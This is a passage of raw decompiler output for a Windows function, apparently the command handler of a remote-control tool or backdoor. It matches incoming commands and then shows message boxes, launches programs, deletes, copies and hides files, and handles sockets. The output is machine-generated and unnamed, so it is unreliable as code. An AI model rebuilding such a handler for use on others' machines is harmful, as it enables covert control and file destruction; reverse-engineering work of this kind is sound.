var_53ch;\n    int32_t *var_538h;\n    uint var_534h;\n    int32_t var_530h;\n    int32_t var_52ch;\n    int32_t *var_528h;\n    uint var_524h;\n    int32_t var_520h;\n    uint var_51ch;\n    int32_t var_518h;\n    uint var_514h;\n    int32_t *var_510h;\n    uint var_50ch;\n    uint var_508h;\n    int32_t var_504h;\n    int32_t var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint var_4f4h;\n    int32_t var_4f0h;\n    int32_t *var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    int32_t *var_4e0h;\n    uint var_4dch;\n    int32_t var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    int32_t var_4c0h;\n    uint var_4bch;\n    int32_t var_4b8h;\n    uint var_4b4h;\n    uint var_4b0h;\n    uint *var_4ach;\n    uint var_4a8h;\n    int32_t *var_4a4h;\n    uint var_4a0h;\n    int32_t *var_49ch;\n    uint *var_498h;\n    int32_t *var_494h;\n    uint var_490h;\n    int32_t *var_48ch;\n    uchar *var_488h;\n    int32_t *var_484h;\n    uint var_480h;\n    int32_t *var_47ch;\n    int32_t *var_478h;\n    int32_t *var_474h;\n    int32_t *var_470h;\n    int32_t *var_46ch;\n    uint *var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint *var_45ch;\n    int32_t *var_458h;\n    uint *var_454h;\n    int32_t *var_450h;\n    uint *var_44ch;\n    int32_t *var_448h;\n    int32_t *var_444h;\n    uint *var_440h;\n    uint *var_43ch;\n    uint *var_438h;\n    uint *var_434h;\n    int32_t var_430h;\n    int32_t var_42ch;\n    int32_t var_428h;\n    uint *var_424h;\n    uint *var_420h;\n    uint *var_41ch;\n    int32_t *var_418h;\n    uint *var_414h;\n    uint *var_410h;\n    uint *var_40ch;\n    uint *var_408h;\n    uint *var_404h;\n    uint *var_400h;\n    uint *var_3fch;\n    uint *var_3f8h;\n    uint *var_3f4h;\n    uint *var_3f0h;\n    uint *var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint *var_3e0h;\n    uint *var_3dch;\n    uint *var_3d8h;\n    uint *var_3d4h;\n    uint *var_3d0h;\n    uint *var_3cch;\n    uint *var_3c8h;\n    uint var_3c4h;\n    uint var_3c0h;\n    uint *var_3bch;\n    uint *var_3b8h;\n    uint var_3b4h;\n    uint var_3b0h;\n    uint *var_3ach;\n    uint var_3a8h;\n    uint var_3a4h;\n    uint *var_3a0h;\n    uint var_39ch;\n    uint var_398h;\n    uint *var_394h;\n    uint var_390h;\n    uint var_38ch;\n    uint *var_388h;\n    uint *var_384h;\n    uint *var_380h;\n    uint var_37ch;\n    uint *var_378h;\n    uint *var_374h;\n    uint *var_370h;\n    uint *var_36ch;\n    uint *var_368h;\n    uint *var_364h;\n    uint *var_360h;\n    uint *var_35ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint *var_350h;\n    uint *var_34ch;\n    uint *var_348h;\n    uint *var_344h;\n    uint *var_340h;\n    uint *var_33ch;\n    uint *var_338h;\n    uint *var_334h;\n    uint *var_330h;\n    uint *var_32ch;\n    uint *var_328h;\n    uint var_324h;\n    uint *var_320h;\n    uint *var_31ch;\n    uint *var_318h;\n    uint *var_314h;\n    uint *var_310h;\n    uint *var_30ch;\n    uint *var_308h;\n    uint *var_304h;\n    uint var_300h;\n    uint *var_2fch;\n    uchar *var_2f8h;\n    uint *var_2f4h;\n    uint *var_2f0h;\n    uint *var_2ech;\n    int32_t *var_2e8h;\n    uint *var_2e4h;\n    uint *var_2e0h;\n    uint *var_2dch;\n    uint *var_2d8h;\n    uint *var_2d4h;\n    uint *var_2d0h;\n    uint *var_2cch;\n    uint *var_2c8h;\n    uint *var_2c4h;\n    uint var_2c0h;\n    int32_t var_2bch;\n    uint *var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint *var_2ach;\n    uint var_2a8h;\n    uint *var_2a4h;\n    uint var_2a0h;\n    uint *var_29ch;\n    uint *var_298h;\n    uint *var_294h;\n    uint *var_290h;\n    uint *var_28ch;\n    uint *var_288h;\n    uint *var_284h;\n    uint *var_280h;\n    uint *var_27ch;\n    uint var_278h;\n    uint *var_274h;\n    uint *var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint *var_260h;\n    uint *var_25ch;\n    uint *var_258h;\n    uint var_254h;\n    int32_t var_250h;\n    uint var_24ch;\n    int32_t var_248h;\n    uint var_244h;\n    uint *var_240h;\n    uint var_23ch;\n    int32_t *var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint *var_22ch;\n    uint var_228h;\n    uint *var_224h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint *var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint *var_20ch;\n    uint lpBuffer;\n    uint var_204h;\n    uint *puStack516;\n    uint uStack512;\n    uint uStack508;\n    uint *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uint *puStack492;\n    int32_t *piStack488;\n    uint32_t uStack484;\n    uint *puStack480;\n    uint *puStack476;\n    uint *puStack472;\n    int32_t *piStack468;\n    int32_t *piStack464;\n    uint *puStack460;\n    uint *puStack456;\n    uint *puStack452;\n    uint *var_1bch;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    int32_t *var_1a8h;\n    uint *var_1a4h;\n    uint *puStack420;\n    uint uStack416;\n    uint var_198h;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint32_t var_188h;\n    uint *puStack392;\n    uint *puStack388;\n    uchar *arg_8h_03;\n    uint *var_38h;\n    int32_t *piStack56;\n    int32_t *piStack52;\n    uint uStack48;\n    uchar *var_28h;\n    int32_t *piStack40;\n    uint uStack36;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    arg_8h_03 = &stack0xfffffffc;\n    arg_8h_02 = &stack0xfffffffc;\n    arg_8h_01 = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    arg_8h = &stack0xfffffffc;\n    puVar13 = &stack0xfffffffc;\n    puVar12 = &stack0xfffffffc;\n    var_ch = 0xf5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_1ch = 0x47602e;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = in_EAX;\n    fcn.004059cc();\n    var_1ch = 0x47603f;\n    fcn.00405fe8();\n    uStack36 = 0x47d442;\n    piStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar11 = true;\n    uStack48 = 0x47d2ff;\n    piStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    piStack56 = 0x476068;\n    var_1ch = &stack0xfffffffc;\n    fcn.00405974();\n    if (uVar11) {\n        piStack56 = 0x476074;\n        fcn.00475d98();\n    }\n    piStack56 = &fcn.00476010::var_20ch;\n    var_38h = 0x47608d;\n    fcn.00405a44();\n    var_38h = 0x47609d;\n    fcn.00405974();\n    if (uVar11) {\n        var_38h = 0x4760b1;\n        fcn.00405a84();\n        var_38h = 0x4760b9;\n        fcn.0048bc7c();\n        *in_FS_OFFSET = piStack56;\n        goto code_r0x0047d309;\n    }\n    var_38h = &fcn.00476010::var_210h;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00409ee4();\n        fcn.00489544();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00405584();\n        fcn.0048d788();\n        fcn.0040ef4c(&fcn.00476010::var_218h, *0x47d4b8);\n        fcn.004055c8();\n        cVar1 = fcn.0048d8f4();\n        if (cVar1 == '\\0') {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.0048d804();\n        if (var_21ch == 0) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        fcn.004609e0();\n        fcn.00409d78();\n        fcn.0048d700();\n        fcn.0048d6c4();\n        uVar3 = fcn.0048a964();\n        uVar11 = 1;\n        fcn.00409e64(uVar3);\n        fcn.0048dc14();\n        fcn.0048df54();\n        fcn.0040a5a8();\n        fcn.0048c158();\n        fcn.0048d73c();\n        fcn.0048e55c();\n        fcn.0048e480();\n        fcn.004058e0();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048d804();\n        if (var_258h == NULL) {\n            fcn.00405530();\n        }\n        else {\n            fcn.004055c8();\n        }\n        uVar3 = fcn.0048a964();\n        uVar11 = 1;\n        fcn.00409e64(uVar3);\n        fcn.0048e55c();\n        fcn.0048d788();\n        fcn.004058e0();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.user32.dll_MessageBoxA_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046d970();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046d970();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00489420();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack388 = 0x476720;\n        fcn.0046d51c();\n        puStack388 = 0x476731;\n        fcn.00475f44(arg_8h_03);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0048b61c();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048b61c();\n        fcn.00405864();\n        fcn.00475d98();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        while( true ) {\n            iVar4 = fcn.00484a2c();\n            uVar11 = iVar4 == 0;\n            if (iVar4 < 1) break;\n            fcn.00484a2c();\n            fcn.00484e64();\n        }\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00484e64();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack388 = 0x476803;\n        sub.wsock32.dll_closesocket();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00473610();\n        fcn.00405974();\n        if (uVar11) {\n            puStack388 = **0x495880;\n            puStack392 = 0x47d700;\n            var_188h = 0x476893;\n            fcn.004058e0();\n            var_188h = 0x47689e;\n            fcn.0046d488();\n        }\n        else {\n            uVar11 = 1;\n            puStack388 = 0x47684a;\n            fcn.0040f23c();\n            puStack388 = var_2ach;\n            puStack392 = 0x47d700;\n            var_188h = 0x476865;\n            fcn.004058e0();\n            var_188h = 0x476870;\n            fcn.0046d488();\n        }\n        var_188h = 0x4768a3;\n        sub.kernel32.dll_GetCurrentProcessId();\n        var_188h = 0x4768a8;\n        fcn.00484e64();\n    }\n    puStack388 = 0x4768c1;\n    fcn.00405a44();\n    puStack388 = 0x4768d1;\n    fcn.00405974();\n    if (uVar11) {\n        puStack388 = 0x4768e5;\n        fcn.00405a84();\n        puStack388 = 0x4768f1;\n        cVar1 = fcn.0048aa68();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            puStack388 = 0x4768ff;\n            fcn.00475d98();\n        }\n    }\n    puStack388 = &fcn.00476010::var_2b8h;\n    puStack392 = 0x476918;\n    fcn.00405a44();\n    puStack392 = 0x476928;\n    fcn.00405974();\n    if (uVar11) {\n        puStack392 = 0x476940;\n        fcn.00405a84();\n        puStack392 = &fcn.00476010::var_ch;\n        var_188h = 0x476951;\n        fcn.00405b28();\n        var_188h = 0x476961;\n        fcn.00405a44();\n        var_188h = 0x47696e;\n        fcn.00405b28();\n        var_188h = 0x47697d;\n        fcn.00405a84();\n        var_188h = 0x476988;\n        fcn.004055c8();\n        var_188h = 0x476996;\n        fcn.00409b84();\n        if (var_2bch == 0) {\n            var_188h = 5;\n            uStack400 = 0x4769fa;\n            fcn.0040a5a8();\n            uStack400 = 0x476a05;\n            uStack400 = fcn.004059dc();\n            uStack404 = 0;\n            uStack408 = 0x476a10;\n            uStack408 = fcn.004059dc();\n            var_198h = 0x47d59c;\n            uStack416 = 0;\n            puStack420 = 0x476a1d;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack420 = 0x476a2c;\n                fcn.00475d98();\n            }\n        }\n        else {\n            var_188h = 5;\n            uStack400 = 0x4769af;\n            fcn.0040a5a8();\n            uStack400 = 0x4769ba;\n            uStack400 = fcn.004059dc();\n            uStack404 = 0x4769c3;\n            uStack404 = fcn.004059dc();\n            uStack408 = 0x4769cc;\n            uStack408 = fcn.004059dc();\n            var_198h = 0x47d59c;\n            uStack416 = 0;\n            puStack420 = 0x4769d9;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack420 = 0x4769e8;\n                fcn.00475d98();\n            }\n        }\n    }\n    puStack420 = &fcn.00476010::var_2c8h;\n    var_1a4h = 0x476a45;\n    fcn.00405a44();\n    var_1a4h = 0x476a55;\n    fcn.00405974();\n    if (uVar11) {\n        var_1a4h = 0x476a6d;\n        fcn.00405a84();\n        var_1a4h = &fcn.00476010::var_ch;\n        var_1a8h = 0x476a7e;\n        fcn.00405b28();\n        var_1a8h = 0x476a8e;\n        fcn.00405a44();\n        var_1a8h = 0x476a9b;\n        fcn.00405b28();\n        var_1a8h = 0x476aaa;\n        fcn.00405a84();\n        var_1a8h = 0x476ab5;\n        fcn.004055c8();\n        var_1a8h = 0x476ac3;\n        fcn.00409b84();\n        if (var_2cch == NULL) {\n            var_1a8h = NULL;\n            uStack432 = 0x476b27;\n            fcn.0040a5a8();\n            uStack432 = 0x476b32;\n            uStack432 = fcn.004059dc();\n            uStack436 = 0;\n            uStack440 = 0x476b3d;\n            uStack440 = fcn.004059dc();\n            uStack444 = 0x47d59c;\n            var_1bch = NULL;\n            puStack452 = 0x476b4a;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack452 = 0x476b59;\n                fcn.00475d98();\n            }\n        }\n        else {\n            var_1a8h = NULL;\n            uStack432 = 0x476adc;\n            fcn.0040a5a8();\n            uStack432 = 0x476ae7;\n            uStack432 = fcn.004059dc();\n            uStack436 = 0x476af0;\n            uStack436 = fcn.004059dc();\n            uStack440 = 0x476af9;\n            uStack440 = fcn.004059dc();\n            uStack444 = 0x47d59c;\n            var_1bch = NULL;\n            puStack452 = 0x476b06;\n            uVar5 = sub.shell32.dll_ShellExecuteA();\n            uVar11 = uVar5 == 0x20;\n            if (uVar5 < 0x21) {\n                puStack452 = 0x476b15;\n                fcn.00475d98();\n            }\n        }\n    }\n    puStack452 = &fcn.00476010::var_2d8h;\n    puStack456 = 0x476b72;\n    fcn.00405a44();\n    puStack456 = 0x476b82;\n    fcn.00405974();\n    if (uVar11) {\n        puStack456 = 0x476b96;\n        fcn.00405a84();\n        puStack456 = &fcn.00476010::var_ch;\n        puStack460 = 0x476ba7;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        puStack460 = 0x476bb7;\n        fcn.00405a44();\n        puStack460 = 0x476bc4;\n        fcn.00405b28();\n        puStack460 = 0x476bd3;\n        fcn.00405a84();\n        puStack460 = 0x476bdb;\n        fcn.00409ee4();\n        puStack460 = 0x476be5;\n        fcn.0048ab10();\n    }\n    puStack460 = &fcn.00476010::var_2dch;\n    piStack464 = 0x476bfe;\n    fcn.00405a44();\n    piStack464 = 0x476c0e;\n    fcn.00405974();\n    if (uVar11) {\n        piStack464 = 0x476c26;\n        fcn.00405a84();\n        piStack464 = &fcn.00476010::var_ch;\n        piStack468 = 0x476c37;\n        fcn.00405b28();\n        piStack468 = 0x476c47;\n        fcn.00405a44();\n        piStack468 = 0x476c54;\n        fcn.00405b28();\n        piStack468 = 0x476c63;\n        fcn.00405a84();\n        piStack468 = 0x476c6b;\n        iVar4 = fcn.00409ee4();\n        uVar11 = iVar4 == 1;\n        if (iVar4 < 2) {\n            piStack468 = 0x476cf4;\n            piStack468 = fcn.004059dc();\n            puStack472 = 0x476cfa;\n            sub.kernel32.dll_DeleteFileA();\n        }\n        else {\n            piStack468 = 0x476c76;\n            iVar4 = fcn.00409ee4();\n            uVar11 = iVar4 == 0;\n            if (-1 < iVar4) {\n                iVar4 = iVar4 + 1;\n                iVar10 = 0;\n                do {\n                    puStack472 = 0x476c87;\n                    iVar6 = fcn.00409ee4();\n                    if (iVar10 == iVar6) {\n                        puStack472 = 0x476c93;\n                        piStack468 = fcn.004059dc();\n                        puStack476 = 0x476c99;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    else {\n                        puStack472 = &fcn.00476010::var_10h;\n                        puStack476 = 0x476cac;\n                        fcn.00405b28();\n                        puStack476 = 0x476cbc;\n                        fcn.00405a44();\n                        puStack476 = 0x476cc9;\n                        fcn.00405b28();\n                        puStack476 = 0x476cd8;\n                        fcn.00405a84();\n                        puStack476 = 0x476ce0;\n                        piStack468 = fcn.004059dc();\n                        puStack480 = 0x476ce6;\n                        sub.kernel32.dll_DeleteFileA();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar4 = iVar4 + -1;\n                    uVar11 = iVar4 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    puStack472 = &fcn.00476010::var_2e0h;\n    puStack476 = 0x476d13;\n    fcn.00405a44();\n    puStack476 = 0x476d23;\n    fcn.00405974();\n    if (uVar11) {\n        puStack476 = 0x476d3b;\n        fcn.00405a84();\n        puStack476 = &fcn.00476010::var_ch;\n        puStack480 = 0x476d4c;\n        fcn.00405b28();\n        puStack480 = 0x476d5c;\n        fcn.00405a44();\n        puStack480 = 0x476d69;\n        fcn.00405b28();\n        puStack480 = 0x476d78;\n        fcn.00405a84();\n        puStack480 = 0x476d80;\n        iVar4 = fcn.00409ee4();\n        uVar11 = iVar4 == 1;\n        if (iVar4 < 2) {\n            puStack480 = 0x476dfd;\n            fcn.0048ac18();\n        }\n        else {\n            puStack480 = 0x476d8b;\n            iVar4 = fcn.00409ee4();\n            uVar11 = iVar4 == 0;\n            if (-1 < iVar4) {\n                iVar4 = iVar4 + 1;\n                iVar10 = 0;\n                do {\n                    puStack480 = 0x476d9c;\n                    iVar6 = fcn.00409ee4();\n                    if (iVar10 == iVar6) {\n                        puStack480 = 0x476da8;\n                        fcn.0048ac18();\n                    }\n                    else {\n                        puStack476 = &fcn.00476010::var_10h;\n                        uStack484 = 0x476dbb;\n                        fcn.00405b28();\n                        uStack484 = 0x476dcb;\n                        fcn.00405a44();\n                        uStack484 = 0x476dd8;\n                        fcn.00405b28();\n                        uStack484 = 0x476de7;\n                        fcn.00405a84();\n                        uStack484 = 0x476def;\n                        fcn.0048ac18();\n                    }\n                    iVar10 = iVar10 + 1;\n                    iVar4 = iVar4 + -1;\n                    uVar11 = iVar4 == 0;\n                } while (!uVar11);\n            }\n        }\n    }\n    puStack480 = 0x476e0a;\n    fcn.00405974();\n    if (uVar11) {\n        puStack480 = 0x476e11;\n        fcn.0048acbc();\n    }\n    puStack480 = &fcn.00476010::var_2e4h;\n    uStack484 = 0x476e2a;\n    fcn.00405a44();\n    uStack484 = 0x476e3a;\n    fcn.00405974();\n    if (uVar11) {\n        uStack484 = 0x476e4e;\n        fcn.00405a84();\n        uStack484 = 0x80;\n        piStack488 = 0x476e5b;\n        piStack488 = fcn.004059dc();\n        puStack492 = 0x476e61;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack492 = &fcn.00476010::var_2e8h;\n    uStack496 = 0x476e7a;\n    fcn.00405a44();\n    uStack496 = 0x476e8a;\n    fcn.00405974();\n    if (uVar11) {\n        uStack496 = 0x476e9e;\n        fcn.00405a84();\n        uStack496 = 2;\n        uStack500 = 0x476ea8;\n        uStack500 = fcn.004059dc();\n        puStack504 = 0x476eae;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack504 = &fcn.00476010::var_2ech;\n    uStack508 = 0x476ec7;\n    fcn.00405a44();\n    uStack508 = 0x476ed7;\n    fcn.00405974();\n    if (uVar11) {\n        uStack508 = 0x476eeb;\n        fcn.00405a84();\n        uStack508 = 1;\n        uStack512 = 0x476ef5;\n        uStack512 = fcn.004059dc();\n        puStack516 = 0x476efb;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    puStack516 = &fcn.00476010::var_2f0h;\n    var_204h = 0x476f14;\n    fcn.00405a44();\n    var_204h = 0x476f24;\n    fcn.00405974();\n    if (uVar11) {\n        var_204h = 0x476f38;\n        fcn.00405a84();\n        var_204h = 4;\n        lpBuffer = 0x476f42;\n        lpBuffer = fcn.004059dc();\n        var_20ch = 0x476f48;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_20ch = &fcn.00476010::var_2f4h;\n    var_210h = 0x476f61;\n    fcn.00405a44();\n    var_210h = 0x476f71;\n    fcn.00405974();\n    if (uVar11) {\n        var_210h = 0x476f85;\n        fcn.00405a84();\n        var_210h = 0x20;\n        var_214h = 0x476f8f;\n        var_214h = fcn.004059dc();\n        var_218h = 0x476f95;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_218h = &fcn.00476010::var_2f8h;\n    var_21ch = 0x476fae;\n    fcn.00405a44();\n    var_21ch = 0x476fbe;\n    fcn.00405974();\n    if (uVar11) {\n        var_21ch = 0x476fd2;\n        fcn.00405a84();\n        var_21ch = 0x100;\n        var_220h = 0x476fdf;\n        var_220h = fcn.004059dc();\n        var_224h = 0x476fe5;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_224h = &fcn.00476010::var_2fch;\n    var_228h = 0x476ffe;\n    fcn.00405a44();\n    var_228h = 0x47700e;\n    fcn.00405974();\n    if (uVar11) {\n        var_228h = 0x477026;\n        fcn.00405a84();\n        var_228h = 0x477039;\n        fcn.0040a490();\n        uVar5 = var_188h;\n        if ((var_188h & 2) == 0) {\n            var_228h = 0x477063;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x477054;\n            fcn.004055c8();\n        }\n        if ((uVar5 & 1) == 0) {\n            var_228h = 0x477087;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x477078;\n            fcn.004055c8();\n        }\n        if ((uVar5 & 0x20) == 0) {\n            var_228h = 0x4770ab;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x47709c;\n            fcn.004055c8();\n        }\n        uVar11 = (uVar5 & 4) == 0;\n        if (uVar11) {\n            var_228h = 0x4770cf;\n            fcn.004055c8();\n        }\n        else {\n            var_228h = 0x4770c0;\n            fcn.004055c8();\n        }\n        var_228h = 0x47d8d0;\n        var_22ch = var_8h;\n        var_230h = 0x47d8e8;\n        var_234h = 0x47d8f4;\n        var_238h = var_ch;\n        var_23ch = 0x47d910;\n        var_240h = var_10h;\n        var_244h = 0x47d910;\n        var_248h = var_14h;\n        var_24ch = 0x47d910;\n        var_250h = var_18h;\n        var_254h = 0x47d91c;\n        var_258h = 0x477111;\n        fcn.004058e0();\n        var_258h = 0x47711c;\n        fcn.00475d98();\n    }\n    var_258h = &fcn.00476010::var_304h;\n    var_25ch = 0x477135;\n    fcn.00405a44();\n    var_25ch = 0x477145;\n    fcn.00405974();\n    if (uVar11) {\n        var_25ch = 0x47715d;\n        fcn.00405a84();\n        uVar11 = **0x495944 == 0;\n        if (!uVar11) {\n            var_25ch = &fcn.00476010::var_ch;\n            var_260h = 0x477181;\n            fcn.00405b28();\n            var_260h = 0x477195;\n            fcn.00405a44();\n            var_260h = 0x4771a7;\n            fcn.00405b28();\n            var_260h = 0x4771b8;\n            fcn.00405a84();\n            var_260h = &fcn.00476010::var_308h;\n            var_264h = 0x4771d1;\n            iVar4 = fcn.00405b28();\n            uVar11 = iVar4 == 1;\n            var_264h = 0x4771e5;\n            fcn.00405a44();\n            var_264h = 0x4771f0;\n            iVar4 = fcn.00409ee4();\n            var_264h = 0x477204;\n            fcn.00405b28();\n            var_264h = 0x477215;\n            fcn.00405a84();\n            var_264h = 0x477225;\n            fcn.004055c8();\n            var_264h = 0x477232;\n            fcn.00405974();\n            if (uVar11) {\n                uVar11 = iVar4 == 1;\n                if (iVar4 < 2) {\n                    var_264h = 0xffffffff;\n                    var_268h = 0x4773b8;\n                    fcn.0040a694();\n                    var_268h = 0x4773cc;\n                    fcn.00405864();\n                    var_268h = 0x4773d7;\n                    var_268h = fcn.004059dc();\n                    var_26ch = 0x4773e0;\n                    var_26ch = fcn.004059dc();\n                    var_270h = 0x4773e6;\n                    sub.kernel32.dll_CopyFileA();\n                    var_270h = 0x4773ee;\n                    var_270h = fcn.004059dc();\n                    var_274h = 0x4773f4;\n                    sub.kernel32.dll_DeleteFileA();\n                }\n                else {\n                    uVar11 = iVar4 == 0;\n                    if (0 < iVar4) {\n                        iVar6 = 1;\n                        iVar10 = iVar4;\n                        do {\n                            if (iVar4 == iVar6) {\n                                var_270h = 0xffffffff;\n                                var_274h = 0x47735f;\n                                fcn.0040a694();\n                                var_274h = 0x477373;\n                                fcn.00405864();\n                                var_274h = 0x47737e;\n                                var_274h = fcn.004059dc();\n                                var_278h = 0x477387;\n                                var_278h = fcn.004059dc();\n                                var_27ch = 0x47738d;\n                                sub.kernel32.dll_CopyFileA();\n                                var_27ch = 0x477395;\n                                var_26ch = fcn.004059dc();\n                                var_280h = 0x47739b;\n                                sub.kernel32.dll_DeleteFileA();\n                            }\n                            else {\n                                var_270h = 0xffffffff;\n                                var_274h = &fcn.00476010::var_314h;\n                                var_278h = 0x47726e;\n                                fcn.00405b28();\n                                var_278h = 0x47727e;\n                                fcn.00405a44();\n                                var_278h = 0x47728f;\n                                fcn.0040a694();\n                                var_278h = 0x4772a3;\n                                fcn.00405864();\n                                var_278h = 0x4772ae;\n                                var_278h = fcn.004059dc();\n                                var_27ch = &fcn.00476010::var_318h;\n                                var_280h = 0x4772c3;\n                                fcn.00405b28();\n                                var_280h = 0x4772d3;\n                                fcn.00405a44();\n                                var_280h = 0x4772de;\n                                var_280h = fcn.004059dc();\n                                var_284h = 0x4772e4;\n                                sub.kernel32.dll_CopyFileA();\n                                var_284h = &fcn.00476010::var_31ch;\n                                var_288h = 0x4772f8;\n                                fcn.00405b28();\n                                var_288h = 0x477308;\n                                fcn.00405a44();\n                                var_1bch = var_31ch;\n                                var_288h = 0x47731f;\n                                var_26ch = fcn.004059dc();\n                                var_28ch = 0x477325;\n                                iVar7 = sub.kernel32.dll_DeleteFileA();\n                                puStack452 = puStack452 & 0xffffff | 1 - (iVar7 == 0) << 0x18;\n                                var_28ch = 0x47733e;\n                                fcn.00405b28();\n                                var_28ch = 0x47734d;\n                                fcn.00405a84();\n                            }\n                            iVar6 = iVar6 + 1;\n                            iVar10 = iVar10 + -1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            else {\n                uVar11 = iVar4 == 1;\n                if (iVar4 < 2) {\n                    var_264h = 0xffffffff;\n                    var_268h = 0x47751b;\n                    fcn.0040a694();\n                    var_268h = 0x47752f;\n                    fcn.00405864();\n                    var_268h = 0x47753a;\n                    var_268h = fcn.004059dc();\n                    var_26ch = 0x477543;\n                    var_26ch = fcn.004059dc();\n                    var_270h = 0x477549;\n                    sub.kernel32.dll_CopyFileA();\n                }\n                else {\n                    uVar11 = iVar4 == 0;\n                    if (0 < iVar4) {\n                        iVar6 = 1;\n                        iVar10 = iVar4;\n                        do {\n                            if (iVar4 == iVar6) {\n                                var_270h = 0xffffffff;\n                                var_274h = 0x4774d3;\n                                fcn.0040a694();\n                                var_274h = 0x4774e7;\n                                fcn.00405864();\n                                var_274h = 0x4774f2;\n                                var_274h = fcn.004059dc();\n                                var_278h = 0x4774fb;\n                                var_26ch = fcn.004059dc();\n                                var_27ch = 0x477501;\n                                sub.kernel32.dll_CopyFileA();\n                            }\n                            else {\n                                var_270h = 0xffffffff;\n                                var_274h = &fcn.00476010::var_338h;\n                                var_278h = 0x47742f;\n                                fcn.00405b28();\n                                var_278h = 0x47743f;\n                                fcn.00405a44();\n                                var_278h = 0x477450;\n                                fcn.0040a694();\n                                var_278h = 0x477464;\n                                fcn.00405864();\n                                var_278h = 0x47746f;\n                                var_278h = fcn.004059dc();\n                                var_27ch = &fcn.00476010::var_33ch;\n                                var_280h = 0x477484;\n                                fcn.00405b28();\n                                var_280h = 0x477494;\n                                fcn.00405a44();\n                                var_280h = 0x47749f;\n                                var_26ch = fcn.004059dc();\n                                var_284h = 0x4774a5;\n                                sub.kernel32.dll_CopyFileA();\n                                var_284h = 0x4774b2;\n                                fcn.00405b28();\n                                var_284h = 0x4774c1;\n                                fcn.00405a84();\n                            }\n                            iVar6 = iVar6 + 1;\n                            iVar10 = iVar10 + 